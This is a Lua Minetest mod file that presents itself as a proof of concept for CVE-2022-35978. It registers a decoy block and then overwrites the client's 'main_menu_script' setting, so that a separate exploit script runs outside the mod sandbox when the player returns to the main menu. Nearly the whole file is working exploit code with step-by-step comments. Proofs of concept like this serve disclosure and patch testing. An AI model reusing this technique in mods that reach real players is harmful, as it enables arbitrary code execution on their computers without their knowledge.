print("[+] CVE-2022-35978: POC LOADED - EXIT TO MAIN MENU TO ACTIVATE CODE")
minetest.register_node("cve_2022_35978:squares", {
	description = "CVE_2022_35978 BLOCK",
	tiles = {
		"minetest_block.png",
		"minetest_block.png",
		"minetest_block.png",
		"minetest_block.png",
		"minetest_block.png",
		"minetest_block.png"
	},
	groups = {cracky=1, level=2, concrete=1}
})

-- Get the current path of our mod.
local mod_path = minetest.get_modpath("cve_2022_35978")
print("[+] Current mod path: ", mod_path)

-- Create the path to the exploit script.
local poc_path = mod_path .. DIR_DELIM .. "cve_2022_35978.lua"
print("[+] Path to exploit script: ", poc_path)

-- Verify if a menu script value is already loaded, defaults to 'nil' if not set.
-- Consider resetting this back to default value if it's been set before.
local old_mm_script = minetest.settings:get("main_menu_script")
print("[+] Before setting main_menu_script: ", old_mm_script)

-- Overwrite path of main menu script and print it out to verify.
minetest.settings:set("main_menu_script", poc_path)
local new_mm_script = minetest.settings:get("main_menu_script")
print("[+] After setting main_menu_script: ", new_mm_script)

-- At this point in the script...
-- 1) The value 'main_menu_script' has been configured in 'minetest.conf'
-- 2) When user goes back to the main menu, code in 'cve_2022_35978.lua' will execute.